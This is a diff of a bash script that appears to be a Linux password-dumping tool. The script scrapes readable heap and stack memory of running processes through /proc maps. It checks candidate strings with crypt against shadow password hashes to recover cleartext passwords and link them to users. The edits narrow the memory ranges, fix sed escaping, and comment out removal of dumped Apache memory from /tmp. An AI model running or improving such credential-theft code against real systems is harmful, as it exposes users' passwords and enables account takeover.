@@ -18,7 +18,7 @@ dump_pid ()
 {
 	pid=$1
 	output_file=$2
-	grep -E "^[0-9a-f-]* r" /proc/$pid/maps | cut -d" " -f 1 |
+	grep -E "^[0-9a-f-]* r" /proc/$pid/maps | egrep 'heap|stack|deleted' |cut -d" " -f 1 |
 	while read memrange; do
 		memrange_start=`echo $memrange | cut -d"-" -f 1`;
 		memrange_start=`printf "%u\n" 0x$memrange_start`;
@@ -46,7 +46,7 @@ while read -r line; do
 		#get ctype
 		CTYPE="$(echo "$2" | cut -c-3)"
 		#Escape quotes, backslashes, single quotes to pass into crypt
-		SAFE=$(echo "$line" | sed 's/\\/\\\\/; s/\"/\\"/; s/'"'"'/\\'"'"'/;')
+		SAFE=$(echo "$line" | sed 's/\\/\\\\/g; s/\"/\\"/g; s/'"'"'/\\'"'"'/g;')
 		CRYPT="\"$SAFE\", \"$CTYPE$3\""
 		if [[ $(python -c "import crypt; print crypt.crypt($CRYPT)") == "$2" ]]; then
 			#Find which user's password it is (useful if used more than once!)
@@ -59,7 +59,7 @@ while read -r line; do
 			CTYPE="$(echo "$thishash" | cut -c-3)"
 			SHADOWSALT="$(echo "$thishash" | cut -d'$' -f 3)"
 			#Escape quotes, backslashes, single quotes to pass into crypt
-			SAFE=$(echo "$line" | sed 's/\\/\\\\/; s/\"/\\"/; s/'"'"'/\\'"'"'/;')
+			SAFE=$(echo "$line" | sed 's/\\/\\\\/g; s/\"/\\"/g; s/'"'"'/\\'"'"'/g;')
 			CRYPT="\"$SAFE\", \"$CTYPE$SHADOWSALT\""
 			if [[ $(python -c "import crypt; print crypt.crypt($CRYPT)") == "$thishash" ]]; then
 				#Find which user's password it is (useful if used more than once!)
@@ -190,7 +190,7 @@ if [[ -e "/etc/apache2/apache2.conf" ]]; then
 			fi
 		done <<< "$DUMP"
 		#cleanup
-		rm -rf /tmp/apache*
+		#rm -rf /tmp/apache*
 	fi
 fi
 
